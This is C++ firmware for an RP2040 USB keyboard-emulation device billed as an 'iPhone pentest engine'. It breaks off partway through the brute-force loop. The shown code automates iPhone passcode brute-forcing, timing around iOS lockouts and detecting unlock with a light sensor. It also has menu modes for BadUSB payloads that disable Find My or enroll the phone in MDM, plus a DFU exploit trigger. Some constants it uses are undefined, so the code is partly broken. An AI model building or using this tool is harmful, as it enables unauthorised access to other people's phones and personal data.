/*
 * rp2040_hid_engine/src/main.cpp
 * UDOO Key — iPhone Pentest Engine v4.0
 *
 * ┌──────────────────────────────────────────────────────────────────────┐
 * │  DUAL 1.44" ST7735 128x128 DISPLAY LAYOUT                          │
 * │                                                                      │
 * │  LEFT SCREEN (128x128) — STATUS DISPLAY                            │
 * │  ┌────────────────┐                                                  │
 * │  │ ◉ PIN BRUTE    │  Header bar (mode color-coded)  y=0  h=14      │
 * │  │ ██ ACTIVE      │  Status badge                   y=15 h=11      │
 * │  │ PIN:  003847   │  Big current value (textSize=2) y=28 h=20      │
 * │  │ #3847 / 10000  │  Attempt / range                y=50 h=10      │
 * │  │ ▓▓▓▓▓░░░ 72%   │  Progress bar                  y=62 h=8       │
 * │  │ ETA: 14h 22m   │  Time estimate                  y=72 h=10      │
 * │  │ LDR:▓▓▓░ 721   │  Sensor bar                    y=85 h=10      │
 * │  │ K:241 UP:00:42 │  Keys + uptime footer           y=97 h=10      │
 * │  └────────────────┘  Total: ~107px, fits 128                        │
 * │                                                                      │
 * │  RIGHT SCREEN (128x128) — TOUCH CONTROL MENU                       │
 * │  ┌────────────────┐                                                  │
 * │  │  TOUCH MENU    │  Header                         y=0  h=12      │
 * │  │[PIN BRT][BADUSB]│ Row1 Mode buttons              y=14 h=24      │
 * │  │[ DFU  ][ RECON]│ Row2 Mode buttons               y=40 h=24      │
 * │  │[PAUSE ][ ABORT]│ Row3 Control buttons             y=66 h=24      │
 * │  │[4-DIG ][ 6-DIG]│ Row4 Config buttons             y=92 h=20      │
 * │  │[SIRI  ][ MDM  ]│ Row5 Payload buttons            y=114 h=14     │
 * │  └────────────────┘  Total: 128px exact                             │
 * └──────────────────────────────────────────────────────────────────────┘
 *
 * SPI Bus (SPI0, shared):  SCK=18  MOSI=19  MISO=20
 * Display screen:          CS=17   DC=16    RST=15   BL=14
 * Control screen:          CS=13   DC=12    RST=11   BL=10
 * XPT2046 touch:           CS=9    IRQ=8
 * LDR sensor:              ADC=26
 * UART→ESP32:              TX=0    RX=1
 * Button (HW fallback):    GPIO=6
 * LED:                     GPIO=7
 *
 * CRITICAL: 1.44" ST7735 init = INITR_144GREENTAB (NOT INITR_BLACKTAB)
 *           128x128 only — pixel rows 128-159 do not exist on this panel.
 */

#include <Arduino.h>
#include <Keyboard.h>
#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include <XPT2046_Touchscreen.h>
#include "udoo_protocol.h"

// ─── Pin Definitions (from platformio.ini -D flags or defaults) ───────────────
#ifndef DISP_CS
  #define DISP_CS   17
  #define DISP_DC   16
  #define DISP_RST  15
  #define DISP_BL   14
  #define CTRL_CS   13
  #define CTRL_DC   12
  #define CTRL_RST  11
  #define CTRL_BL   10
  #define TOUCH_CS   9
  #define TOUCH_IRQ  8
  #define TFT_MOSI  19
  #define TFT_SCK   18
  #define TFT_MISO  20
  #define LDR_ADC_PIN 26
#endif

#define ESP32_SERIAL  Serial1
#define BUTTON_PIN    6
#define LED_PIN       7

// ─── Screen Dimensions ────────────────────────────────────────────────────────
#define TFT_W  128
#define TFT_H  128   // 1.44" panel — 128x128 square, NOT 128x160

// ─── Colour Palette ───────────────────────────────────────────────────────────
// Carefully chosen for visibility in dim environments
#define C_BG        0x0000   // Black
#define C_PANEL     0x1082   // Very dark grey (#101010)
#define C_HEADER    0x001F   // Blue
#define C_ACCENT    0x07FF   // Cyan
#define C_GREEN     0x07E0   // Green  — safe/active
#define C_YELLOW    0xFFE0   // Yellow — warning
#define C_RED       0xF800   // Red    — abort/danger
#define C_WHITE     0xFFFF
#define C_GREY      0x8410   // Mid grey
#define C_DARKGREY  0x4208
#define C_ORANGE    0xFD20   // Orange — BadUSB
#define C_PURPLE    0x780F   // Purple — DFU exploit

// Mode colours (header bar)
static const uint16_t MODE_COLORS[] = {
    C_GREY,    // IDLE
    C_ORANGE,  // BADUSB
    C_GREEN,   // IPHONE_BRUTE
    C_PURPLE,  // DFU_EXPLOIT
    C_YELLOW,  // USB_RECON
};
static const char* MODE_NAMES[] = {
    "IDLE", "BAD-USB", "PIN BRUTE", "DFU EXPLOIT", "USB RECON"
};

// ─── Attack Modes ─────────────────────────────────────────────────────────────
enum class Mode : uint8_t {
    IDLE         = 0,
    BADUSB       = 1,
    IPHONE_BRUTE = 2,
    DFU_EXPLOIT  = 3,
    USB_RECON    = 4,
    _COUNT       = 5
};

// BadUSB payload IDs
#define BADUSB_SIRI_SHORTCUT   0x01
#define BADUSB_SHORTCUTS_EXEC  0x02
#define BADUSB_DISABLE_FIND_MY 0x04
#define BADUSB_MDM_ENROLL      0x05
#define BADUSB_CUSTOM          0xFF

// ─── TFT Instances ────────────────────────────────────────────────────────────
// Both screens on the same SPI0 hardware bus, different CS lines
Adafruit_ST7735 tft_disp(&SPI, DISP_CS, DISP_DC, DISP_RST);  // Status display
Adafruit_ST7735 tft_ctrl(&SPI, CTRL_CS, CTRL_DC, CTRL_RST);  // Touch menu

// XPT2046 touch on the control screen
XPT2046_Touchscreen touch(TOUCH_CS, TOUCH_IRQ);

// ─── Touch Button Registry ────────────────────────────────────────────────────
struct TouchButton {
    uint16_t x, y, w, h;
    uint16_t color;
    uint16_t text_color;
    const char* label;
    uint8_t  action;
};

// Action IDs
#define ACT_MODE_BRUTE    0x10
#define ACT_MODE_BADUSB   0x11
#define ACT_MODE_DFU      0x12
#define ACT_MODE_RECON    0x13
#define ACT_PAUSE         0x20
#define ACT_ABORT         0x21
#define ACT_PIN_4         0x30
#define ACT_PIN_6         0x31
#define ACT_PAYLOAD_SIRI  0x40
#define ACT_PAYLOAD_MDM   0x41
#define ACT_START         0x50

// Touch calibration — adjust to your specific XPT2046 + screen combo
#define TOUCH_X_MIN   340
#define TOUCH_X_MAX   3700
#define TOUCH_Y_MIN   250
#define TOUCH_Y_MAX   3800

// ─── Touch Button Layout for 128x128 ─────────────────────────────────────────
// 2-column grid. Available height after 12px header = 116px.
// Rows 1-3: 24px tall (mode + control buttons)
// Rows 4-5: 20px tall (config buttons, tighter)
// 2px gap between rows keeps total = 12 + (24+2)*3 + (20+2)*2 = 12+78+44 = 134 → trim gaps
//
// Actual layout (no gap between rows, snug):
//   Header:  y=0   h=12
//   Row1:    y=13  h=23  (BRUTE / BADUSB)
//   Row2:    y=37  h=23  (DFU / RECON)
//   Row3:    y=61  h=23  (PAUSE / ABORT)
//   Row4:    y=85  h=21  (4-DIG / 6-DIG)
//   Row5:    y=107 h=21  (SIRI / MDM)    → ends at y=128 ✓
//
// Column widths: 2px pad + 60px + 4px gap + 62px... simplify: 2 equal cols
//   ColA:  x=2   w=60
//   ColB:  x=66  w=60   (2+60+4=66)

#define BTN_W    60
#define COL_A     2
#define COL_B    66
// Row y-positions
#define ROW1_Y   13
#define ROW2_Y   37
#define ROW3_Y   61
#define ROW4_Y   85
#define ROW5_Y  107
// Row heights
#define ROW123_H  22
#define ROW45_H   20

static const TouchButton BUTTONS[] = {
    // Row 1: Mode selectors
    { COL_A, ROW1_Y, BTN_W, ROW123_H, C_GREEN,   C_BG,    "PIN BRT",  ACT_MODE_BRUTE  },
    { COL_B, ROW1_Y, BTN_W, ROW123_H, C_ORANGE,  C_BG,    "BAD-USB",  ACT_MODE_BADUSB },
    // Row 2
    { COL_A, ROW2_Y, BTN_W, ROW123_H, C_PURPLE,  C_WHITE, "DFU",      ACT_MODE_DFU    },
    { COL_B, ROW2_Y, BTN_W, ROW123_H, C_YELLOW,  C_BG,    "RECON",    ACT_MODE_RECON  },
    // Row 3: Control
    { COL_A, ROW3_Y, BTN_W, ROW123_H, C_GREY,    C_WHITE, "PAUSE",    ACT_PAUSE       },
    { COL_B, ROW3_Y, BTN_W, ROW123_H, C_RED,     C_WHITE, "ABORT",    ACT_ABORT       },
    // Row 4: PIN digits
    { COL_A, ROW4_Y, BTN_W, ROW45_H,  C_ACCENT,  C_BG,    "4-DIGIT",  ACT_PIN_4       },
    { COL_B, ROW4_Y, BTN_W, ROW45_H,  C_ACCENT,  C_BG,    "6-DIGIT",  ACT_PIN_6       },
    // Row 5: BadUSB payloads
    { COL_A, ROW5_Y, BTN_W, ROW45_H,  C_ORANGE,  C_BG,    "SIRI",     ACT_PAYLOAD_SIRI},
    { COL_B, ROW5_Y, BTN_W, ROW45_H,  C_ORANGE,  C_BG,    "MDM",      ACT_PAYLOAD_MDM },
};
#define NUM_BUTTONS (sizeof(BUTTONS) / sizeof(BUTTONS[0]))

// ─── Global State ─────────────────────────────────────────────────────────────
static Mode     current_mode      = Mode::IDLE;
static bool     is_paused         = false;
static bool     cover_blown       = false;
static uint32_t brute_attempts    = 0;
static uint32_t key_counter       = 0;
static uint32_t macro_counter     = 0;
static uint32_t session_start_ms  = 0;

// LDR
static int      ldr_high          = 0;
static int      ldr_low           = 1023;
static int      ldr_val           = 0;
static bool     calibrated        = false;
#define LDR_TOLERANCE   12
#define LDR_CALIBRATE_MS 4000
#define LDR_POLL_MS     30
#define COOLDOWN_MS     5500
#define LOCKOUT_EVERY   5
#define LOCKOUT_WAIT_MS 65000

// Brute-force
static BruteConfig brute_cfg = {
    .start_code    = 0,
    .end_code      = 9999,
    .delay_ms      = (uint16_t)COOLDOWN_MS,
    .lockout_delay = (uint16_t)(LOCKOUT_WAIT_MS & 0xFFFF),
    .lockout_every = LOCKOUT_EVERY,
    .digits        = 4,
    .light_abort   = 1,
    .pad           = 0
};
static uint32_t current_pin  = 0;
static bool     brute_active = false;

// BadUSB
static uint8_t  badusb_payload_id = BADUSB_SIRI_SHORTCUT;
static bool     badusb_fired      = false;

// DFU
static bool     dfu_active   = false;
static uint8_t  exploit_step = 0;

// Button debounce (HW button)
static unsigned long btn_last_ms = 0;
static bool          btn_held    = false;

// Display dirty flags (only redraw when state changes)
static bool disp_dirty  = true;
static bool ctrl_dirty  = true;
static Mode last_mode   = Mode::_COUNT;  // Force first draw

// ─── Forward Declarations ─────────────────────────────────────────────────────
void init_displays();
void draw_status_screen();
void draw_control_screen();
void draw_button(Adafruit_ST7735& tft, const TouchButton& btn, bool pressed);
void draw_ldr_bar(int16_t x, int16_t y, int16_t w, int16_t h);
void draw_uptime(int16_t x, int16_t y);
void handle_touch();
void dispatch_action(uint8_t action);
void calibrate_ldr();
void update_ldr();
bool screen_changed();
bool wait_for_screen_change(uint32_t timeout_ms);
void handle_hw_button();
void run_badusb(uint8_t payload_id);
void run_brute_step();
void run_dfu_step();
void process_esp32_packet();
void send_telemetry();
void type_pin_hid(uint32_t pin, uint8_t digits);
void emergency_abort(const char* reason);
void hid_type_string(const char* s, uint16_t char_delay_ms = 80);
void hid_key_combo(uint8_t mod, uint8_t key);

// ─── Display Init ─────────────────────────────────────────────────────────────
void init_displays() {
    // Bring up SPI0 at 40MHz
    SPI.begin();

    // Backlight pins
    pinMode(DISP_BL, OUTPUT); digitalWrite(DISP_BL, HIGH);
    pinMode(CTRL_BL, OUTPUT); digitalWrite(CTRL_BL, HIGH);

    // Status display (left) — 1.44" 128x128 green-tab panel
    tft_disp.initR(INITR_144GREENTAB);
    tft_disp.setRotation(0);
    tft_disp.fillScreen(C_BG);

    // Control display (right) — 1.44" 128x128 green-tab panel
    tft_ctrl.initR(INITR_144GREENTAB);
    tft_ctrl.setRotation(0);
    tft_ctrl.fillScreen(C_BG);

    // Touch controller
    touch.begin();
    touch.setRotation(1);

    // Boot splash on status screen
    tft_disp.fillScreen(C_BG);
    tft_disp.setTextColor(C_ACCENT);
    tft_disp.setTextSize(2);
    tft_disp.setCursor(8, 40);
    tft_disp.print("UDOO KEY");
    tft_disp.setTextColor(C_WHITE);
    tft_disp.setTextSize(1);
    tft_disp.setCursor(8, 70);
    tft_disp.print("iPhone Pentest");
    tft_disp.setCursor(8, 82);
    tft_disp.print("Engine v4.0");
    tft_disp.setTextColor(C_GREY);
    tft_disp.setCursor(8, 100);
    tft_disp.print("RP2040 + ESP32");
    tft_disp.setCursor(8, 112);
    tft_disp.print("Dual ST7735 UI");

    // Boot splash on control screen
    tft_ctrl.fillScreen(C_BG);
    tft_ctrl.setTextColor(C_ORANGE);
    tft_ctrl.setTextSize(2);
    tft_ctrl.setCursor(12, 40);
    tft_ctrl.print("CONTROLS");
    tft_ctrl.setTextColor(C_GREY);
    tft_ctrl.setTextSize(1);
    tft_ctrl.setCursor(12, 70);
    tft_ctrl.print("Touch to begin...");

    delay(1800);
}

// ─── Status Screen (Left TFT) ─────────────────────────────────────────────────
void draw_status_screen() {
    if (!disp_dirty && current_mode == last_mode) return;
    disp_dirty = false;
    last_mode  = current_mode;

    tft_disp.fillScreen(C_BG);

    // ── Header bar ────────────────────────────────────────────────────────────
    uint16_t hdr_color = MODE_COLORS[(int)current_mode];
    tft_disp.fillRect(0, 0, TFT_W, 18, hdr_color);
    tft_disp.setTextColor(C_WHITE);
    tft_disp.setTextSize(1);
    tft_disp.setCursor(4, 5);
    tft_disp.print("◉ ");
    tft_disp.print(MODE_NAMES[(int)current_mode]);

    // ── Status/Pause badge ────────────────────────────────────────────────────
    uint16_t badge_col = is_paused ? C_YELLOW : (cover_blown ? C_RED : C_GREEN);
    const char* badge  = is_paused ? "  PAUSED  " : (cover_blown ? "  ABORTED " : "  ACTIVE  ");
    tft_disp.fillRect(0, 20, TFT_W, 12, badge_col);
    tft_disp.setTextColor(C_BG);
    tft_disp.setTextSize(1);
    tft_disp.setCursor(22, 23);
    tft_disp.print(badge);

    // ── Mode-specific info block ──────────────────────────────────────────────
    tft_disp.setTextColor(C_GREY);
    tft_disp.setTextSize(1);

    int y = 38;
    auto label = [&](const char* lbl, int yoff) {
        tft_disp.setTextColor(C_GREY);
        tft_disp.setCursor(2, yoff);
        tft_disp.print(lbl);
    };
    auto value = [&](const char* val, uint16_t col, int yoff) {
        tft_disp.setTextColor(col);
        tft_disp.print(val);
    };

    if (current_mode == Mode::IPHONE_BRUTE) {
        // Current PIN (big)
        tft_disp.setTextColor(C_ACCENT);
        tft_disp.setTextSize(2);
        tft_disp.setCursor(8, y);
        char pinbuf[10];
        snprintf(pinbuf, sizeof(pinbuf), "%0*lu",
            (int)brute_cfg.digits, (unsigned long)current_pin);
        tft_disp.print("PIN: ");
        tft_disp.print(pinbuf);
        y += 22;

        tft_disp.setTextSize(1);
        tft_disp.setTextColor(C_WHITE);
        tft_disp.setCursor(2, y);
        tft_disp.print("Attempts: ");
        tft_disp.setTextColor(C_ACCENT);
        tft_disp.print(brute_attempts);
        y += 14;

        // Progress bar
        uint32_t range = brute_cfg.end_code - brute_cfg.start_code + 1;
        uint32_t done  = current_pin - brute_cfg.start_code;
        int bar_w = (int)((float)done / range * (TFT_W - 4));
        tft_disp.drawRect(2, y, TFT_W - 4, 8, C_GREY);
        tft_disp.fillRect(2, y, bar_w, 8, C_GREEN);
        y += 14;

        // ETA estimate (rough)
        if (brute_attempts > 0) {
            uint32_t elapsed_s = (millis() - session_start_ms) / 1000;
            uint32_t remaining = brute_cfg.end_code - current_pin;
            uint32_t eta_s     = elapsed_s > 0
                ? (uint32_t)((float)elapsed_s / brute_attempts * remaining) : 0;
            char eta_buf[22];
            snprintf(eta_buf, sizeof(eta_buf), "ETA: %luh %02lum",
                (unsigned long)(eta_s / 3600),
                (unsigned long)((eta_s % 3600) / 60));
            tft_disp.setTextColor(C_YELLOW);
            tft_disp.setCursor(2, y);
            tft_disp.print(eta_buf);
            y += 12;
        }

    } else if (current_mode == Mode::BADUSB) {
        tft_disp.setTextColor(C_ORANGE);
        tft_disp.setTextSize(1);
        tft_disp.setCursor(2, y);
        tft_disp.print("PAYLOAD: 0x");
        tft_disp.print(badusb_payload_id, HEX);
        y += 14;
        tft_disp.setTextColor(badusb_fired ? C_GREEN : C_YELLOW);
        tft_disp.setCursor(2, y);
        tft_disp.print(badusb_fired ? "STATUS: FIRED OK" : "STATUS: ARMED");
        y += 14;

    } else if (current_mode == Mode::DFU_EXPLOIT) {
        tft_disp.setTextColor(C_PURPLE);
        tft_disp.setTextSize(1);
        tft_disp.setCursor(2, y);
        tft_disp.print("DFU EXPLOIT");
        y += 12;
        char stepbuf[20];
        snprintf(stepbuf, sizeof(stepbuf), "STEP: %u / 3", exploit_step);
        tft_disp.setTextColor(C_WHITE);
        tft_disp.setCursor(2, y);
        tft_disp.print(stepbuf);
        y += 14;
        tft_disp.setTextColor(dfu_active ? C_GREEN : C_GREY);
        tft_disp.setCursor(2, y);
        tft_disp.print(dfu_active ? "TARGET: DETECTED" : "TARGET: WAITING");
        y += 14;

    } else if (current_mode == Mode::USB_RECON) {
        tft_disp.setTextColor(C_YELLOW);
        tft_disp.setCursor(2, y);
        tft_disp.print("USB RECON MODE");
        y += 14;
        tft_disp.setTextColor(C_GREY);
        tft_disp.setCursor(2, y);
        tft_disp.print("Fingerprinting...");
        y += 14;

    } else {
        tft_disp.setTextColor(C_GREY);
        tft_disp.setCursor(2, y);
        tft_disp.print("SELECT MODE ON");
        y += 12;
        tft_disp.setCursor(2, y);
        tft_disp.print("TOUCH SCREEN →");
        y += 14;
    }

    // ── LDR sensor bar ────────────────────────────────────────────────────────
    // Fixed y-anchor safe for 128px height: LDR at y=85, footer at y=97
    int ldr_y = 85;
    tft_disp.setTextColor(C_GREY);
    tft_disp.setTextSize(1);
    tft_disp.setCursor(2, ldr_y);
    tft_disp.print("LDR:");
    draw_ldr_bar(28, ldr_y, 70, 8);
    tft_disp.setCursor(100, ldr_y);
    tft_disp.setTextColor(C_ACCENT);
    tft_disp.print(ldr_val);

    // ── Key/macro counters ────────────────────────────────────────────────────
    int footer_y = 97;
    tft_disp.setTextColor(C_DARKGREY);
    tft_disp.setCursor(2, footer_y);
    char kbuf[22];
    snprintf(kbuf, sizeof(kbuf), "K:%-5lu MC:%-4lu",
        (unsigned long)key_counter, (unsigned long)macro_counter);
    tft_disp.print(kbuf);

    // ── Uptime ────────────────────────────────────────────────────────────────
    int uptime_y = 109;
    tft_disp.setTextColor(C_DARKGREY);
    draw_uptime(2, uptime_y);
}

void draw_ldr_bar(int16_t x, int16_t y, int16_t w, int16_t h) {
    tft_disp.drawRect(x, y, w, h, C_GREY);
    int fill = (int)((float)ldr_val / ldr_high * (w - 2));
    fill = constrain(fill, 0, w - 2);
    uint16_t bar_col = fill > (w * 3 / 4) ? C_RED :
                       fill > (w / 2)      ? C_YELLOW : C_GREEN;
    tft_disp.fillRect(x + 1, y + 1, fill, h - 2, bar_col);
}

void draw_uptime(int16_t x, int16_t y) {
    uint32_t secs  = (millis() - session_start_ms) / 1000;
    uint32_t h_val = secs / 3600;
    uint32_t m_val = (secs % 3600) / 60;
    uint32_t s_val = secs % 60;
    char buf[22];
    snprintf(buf, sizeof(buf), "UP: %02lu:%02lu:%02lu",
        (unsigned long)h_val, (unsigned long)m_val, (unsigned long)s_val);
    tft_disp.setCursor(x, y);
    tft_disp.print(buf);
}

// ─── Control Screen (Right TFT — Touch Menu) ──────────────────────────────────
void draw_control_screen() {
    if (!ctrl_dirty) return;
    ctrl_dirty = false;

    tft_ctrl.fillScreen(C_BG);

    // Header
    tft_ctrl.fillRect(0, 0, TFT_W, 12, C_PANEL);
    tft_ctrl.setTextColor(C_ACCENT);
    tft_ctrl.setTextSize(1);
    tft_ctrl.setCursor(22, 2);
    tft_ctrl.print("TOUCH CONTROLS");

    // Draw all buttons
    for (size_t i = 0; i < NUM_BUTTONS; i++) {
        draw_button(tft_ctrl, BUTTONS[i], false);
    }

    // Highlight active mode button
    for (size_t i = 0; i < 4; i++) {
        if ((int)current_mode - 1 == (int)i) {
            // Draw a bright border around the active mode button
            tft_ctrl.drawRect(BUTTONS[i].x - 1, BUTTONS[i].y - 1,
                              BUTTONS[i].w + 2, BUTTONS[i].h + 2, C_WHITE);
        }
    }

    // PIN digit indicator
    int16_t digit_y = 12 + (BTN_H + BTN_PAD) * 3 + BTN_H + 6;
    tft_ctrl.setTextColor(C_GREY);
    tft_ctrl.setTextSize(1);
    tft_ctrl.setCursor(2, digit_y);
    char cfg_buf[22];
    snprintf(cfg_buf, sizeof(cfg_buf), "PIN:%u-digit  LDR:%d",
        brute_cfg.digits, ldr_val);
    tft_ctrl.print(cfg_buf);
}

void draw_button(Adafruit_ST7735& tft, const TouchButton& btn, bool pressed) {
    uint16_t bg  = pressed ? C_WHITE : btn.color;
    uint16_t txt = pressed ? C_BG    : btn.text_color;

    tft.fillRoundRect(btn.x, btn.y, btn.w, btn.h, 4, bg);
    tft.drawRoundRect(btn.x, btn.y, btn.w, btn.h, 4, C_WHITE);

    // Center text
    int16_t tx = btn.x + (btn.w - strlen(btn.label) * 6) / 2;
    int16_t ty = btn.y + (btn.h - 8) / 2;
    tft.setTextColor(txt);
    tft.setTextSize(1);
    tft.setCursor(tx, ty);
    tft.print(btn.label);
}

// ─── Touch Input ─────────────────────────────────────────────────────────────
/*
 * XPT2046 returns raw 12-bit values (0-4095).
 * We map those to screen pixels via calibration constants.
 * The touch screen is mounted on the CONTROL TFT (right screen).
 */
void handle_touch() {
    if (!touch.tirqTouched() || !touch.touched()) return;

    TS_Point p = touch.getPoint();

    // Map raw touch coords to screen pixels
    int16_t sx = map(p.x, TOUCH_X_MIN, TOUCH_X_MAX, 0, TFT_W);
    int16_t sy = map(p.y, TOUCH_Y_MIN, TOUCH_Y_MAX, 0, TFT_H);
    sx = constrain(sx, 0, TFT_W - 1);
    sy = constrain(sy, 0, TFT_H - 1);

    Serial.printf("[TOUCH] Raw(%d,%d) -> Screen(%d,%d)\n", p.x, p.y, sx, sy);

    // Hit-test all buttons
    for (size_t i = 0; i < NUM_BUTTONS; i++) {
        const TouchButton& btn = BUTTONS[i];
        if (sx >= btn.x && sx <= btn.x + btn.w &&
            sy >= btn.y && sy <= btn.y + btn.h) {

            // Visual feedback — flash the button
            draw_button(tft_ctrl, btn, true);
            delay(80);
            draw_button(tft_ctrl, btn, false);

            dispatch_action(btn.action);
            ctrl_dirty = true;
            disp_dirty = true;
            return;
        }
    }

    // Debounce: wait for finger lift
    while (touch.touched()) delay(10);
}

// ─── Action Dispatcher ────────────────────────────────────────────────────────
void dispatch_action(uint8_t action) {
    Serial.printf("[ACTION] 0x%02X\n", action);

    switch (action) {
        case ACT_MODE_BRUTE:
            current_mode = Mode::IPHONE_BRUTE;
            brute_active = true;
            current_pin  = brute_cfg.start_code;
            is_paused    = false;
            cover_blown  = false;
            brute_attempts = 0;
            session_start_ms = millis();
            Serial.println("[MODE] → PIN BRUTE");
            break;

        case ACT_MODE_BADUSB:
            current_mode  = Mode::BADUSB;
            badusb_fired  = false;
            is_paused     = false;
            session_start_ms = millis();
            Serial.println("[MODE] → BAD-USB");
            break;

        case ACT_MODE_DFU:
            current_mode  = Mode::DFU_EXPLOIT;
            dfu_active    = true;
            exploit_step  = 0;
            is_paused     = false;
            session_start_ms = millis();
            // Signal ESP32 to prepare payload
            {
                PacketHeader hdr = { PROTOCOL_SYNC_BYTE, PKT_DFU_TRIGGER, 0 };
                ESP32_SERIAL.write((uint8_t*)&hdr, sizeof(hdr));
            }
            Serial.println("[MODE] → DFU EXPLOIT");
            break;

        case ACT_MODE_RECON:
            current_mode = Mode::USB_RECON;
            is_paused    = false;
            session_start_ms = millis();
            Serial.println("[MODE] → USB RECON");
            break;

        case ACT_PAUSE:
            is_paused = !is_paused;
            if (is_paused) Keyboard.releaseAll();
            Serial.printf("[CTRL] %s\n", is_paused ? "PAUSED" : "RESUMED");
            break;

        case ACT_ABORT:
            emergency_abort("TOUCH ABORT");
            break;

        case ACT_PIN_4:
            brute_cfg.digits   = 4;
            brute_cfg.end_code = 9999;
            Serial.println("[CFG] 4-digit PIN selected");
            break;

        case ACT_PIN_6:
            brute_cfg.digits   = 6;
            brute_cfg.end_code = 999999;
            Serial.println("[CFG] 6-digit PIN selected");
            break;

        case ACT_PAYLOAD_SIRI:
            badusb_payload_id = BADUSB_SIRI_SHORTCUT;
            badusb_fired      = false;
            Serial.println("[CFG] BadUSB: Siri payload selected");
            break;

        case ACT_PAYLOAD_MDM:
            badusb_payload_id = BADUSB_MDM_ENROLL;
            badusb_fired      = false;
            Serial.println("[CFG] BadUSB: MDM enroll payload selected");
            break;
    }
}

// ─── LDR / Screen-Change Detection ───────────────────────────────────────────
void calibrate_ldr() {
    tft_disp.fillScreen(C_BG);
    tft_disp.setTextColor(C_ACCENT);
    tft_disp.setTextSize(1);
    tft_disp.setCursor(4, 30);
    tft_disp.print("LDR CALIBRATION");
    tft_disp.setTextColor(C_WHITE);
    tft_disp.setCursor(4, 50);
    tft_disp.print("Tape sensor flat");
    tft_disp.setCursor(4, 62);
    tft_disp.print("against phone");
    tft_disp.setCursor(4, 74);
    tft_disp.print("screen now...");

    // Animated calibration bar
    unsigned long end_ms = millis() + LDR_CALIBRATE_MS;
    while (millis() < end_ms) {
        int v = analogRead(LDR_ADC_PIN);
        if (v > ldr_high) ldr_high = v;
        if (v < ldr_low)  ldr_low  = v;
        ldr_val = v;

        // Progress bar
        int prog = (int)((float)(LDR_CALIBRATE_MS - (end_ms - millis())) / LDR_CALIBRATE_MS * (TFT_W - 8));
        tft_disp.fillRect(4, 100, prog, 10, C_GREEN);
        tft_disp.drawRect(4, 100, TFT_W - 8, 10, C_GREY);

        char buf[20];
        snprintf(buf, sizeof(buf), "HI:%-4d LO:%-4d", ldr_high, ldr_low);
        tft_disp.fillRect(0, 118, TFT_W, 12, C_BG);
        tft_disp.setTextColor(C_YELLOW);
        tft_disp.setCursor(4, 118);
        tft_disp.print(buf);

        delay(20);
    }
    calibrated = true;
}

void update_ldr() {
    ldr_val = analogRead(LDR_ADC_PIN);
    if (ldr_val > ldr_high) ldr_high = ldr_val;
}

bool screen_changed() {
    update_ldr();
    return (ldr_val < (ldr_high - LDR_TOLERANCE));
}

bool wait_for_screen_change(uint32_t timeout_ms) {
    unsigned long deadline = millis() + timeout_ms;
    delay(300);
    while (millis() < deadline) {
        if (screen_changed()) return true;
        if (is_paused || cover_blown) return false;
        handle_touch();
        handle_hw_button();
        // Live LDR update on status screen during wait
        static unsigned long last_refresh = 0;
        if (millis() - last_refresh > 300) {
            last_refresh = millis();
            update_ldr();
            disp_dirty = true;
            draw_status_screen();
        }
        delay(LDR_POLL_MS);
    }
    return false;
}

// ─── Hardware Button ──────────────────────────────────────────────────────────
void handle_hw_button() {
    bool pressed = (digitalRead(BUTTON_PIN) == LOW);
    unsigned long now = millis();

    if (pressed && !btn_held) {
        btn_held    = true;
        btn_last_ms = now;
    }
    if (!pressed && btn_held) {
        btn_held = false;
        unsigned long held_ms = now - btn_last_ms;
        if (held_ms > 1500) {
            // Long press: cycle mode (same as touch mode buttons)
            current_mode = (Mode)(((int)current_mode + 1) % (int)Mode::_COUNT);
            ctrl_dirty = disp_dirty = true;
        } else if (held_ms > 50) {
            is_paused = !is_paused;
            if (is_paused) Keyboard.releaseAll();
            ctrl_dirty = disp_dirty = true;
        }
    }
}

// ─── HID Helpers ─────────────────────────────────────────────────────────────
void hid_type_string(const char* s, uint16_t char_delay_ms) {
    for (int i = 0; s[i]; i++) {
        Keyboard.print(s[i]);
        key_counter++;
        delay(char_delay_ms);
    }
}

void hid_key_combo(uint8_t mod, uint8_t key) {
    Keyboard.press((KeyboardKeycode)mod);
    delay(50);
    Keyboard.press((KeyboardKeycode)key);
    delay(80);
    Keyboard.releaseAll();
    delay(150);
}

// ─── PIN Typer ────────────────────────────────────────────────────────────────
void type_pin_hid(uint32_t pin, uint8_t digits) {
    char buf[8] = {0};
    snprintf(buf, sizeof(buf), "%0*lu", (int)digits, (unsigned long)pin);

    Serial.printf("[BRUTE] PIN: %s  #%lu\n", buf, (unsigned long)brute_attempts + 1);

    // Update display with current PIN before typing
    tft_disp.fillRect(0, 34, TFT_W, 20, C_BG);
    tft_disp.setTextColor(C_ACCENT);
    tft_disp.setTextSize(2);
    tft_disp.setCursor(4, 36);
    tft_disp.print(buf);

    for (int i = 0; i < digits; i++) {
        Keyboard.press((KeyboardKeycode)(buf[i]));
        delay(60);
        Keyboard.release((KeyboardKeycode)(buf[i]));
        delay(90);
    }
    key_counter  += digits;
    brute_attempts++;
    macro_counter++;
    disp_dirty = true;
}

// ─── Brute-force Engine ───────────────────────────────────────────────────────
void run_brute_step() {
    if (!brute_active || is_paused || cover_blown) return;

    if (current_pin > brute_cfg.end_code) {
        brute_active = false;
        tft_disp.fillScreen(C_BG);
        tft_disp.setTextColor(C_RED);
        tft_disp.setTextSize(1);
        tft_disp.setCursor(4, 60);
        tft_disp.print("PIN SPACE");
        tft_disp.setCursor(4, 76);
        tft_disp.print("EXHAUSTED");
        tft_disp.setTextColor(C_GREY);
        tft_disp.setCursor(4, 92);
        tft_disp.print("No match found.");
        return;
    }

    type_pin_hid(current_pin, brute_cfg.digits);
    bool changed = wait_for_screen_change(brute_cfg.delay_ms + 1000);
    if (!changed) delay(800);

    // iOS lockout handling
    if (brute_attempts > 0 && brute_attempts % brute_cfg.lockout_every == 0) {
        Serial.printf("[BRUTE] Lockout pause %ums\n", brute_cfg.lockout_delay);

        tft_disp.fillRect(0, 60, TFT_W, 40, C_BG);
        tft_disp.setTextColor(C_YELLOW);
        tft_disp.setTextSize(1);
        tft_disp.setCursor(4, 65);
        char lbuf[22];
        snprintf(lbuf, sizeof(lbuf), "iOS LOCKOUT: %lus",
            (unsigned long)(brute_cfg.lockout_delay / 1000));
        tft_disp.print(lbuf);

        unsigned long wait_end = millis() + brute_cfg.lockout_delay;
        while (millis() < wait_end) {
            digitalWrite(LED_PIN, HIGH); delay(400);
            digitalWrite(LED_PIN, LOW);  delay(400);
            handle_touch();
            handle_hw_button();
            if (is_paused || cover_blown) return;
            // Countdown on display
            uint32_t rem = (wait_end - millis()) / 1000;
            tft_disp.fillRect(4, 78, 80, 10, C_BG);
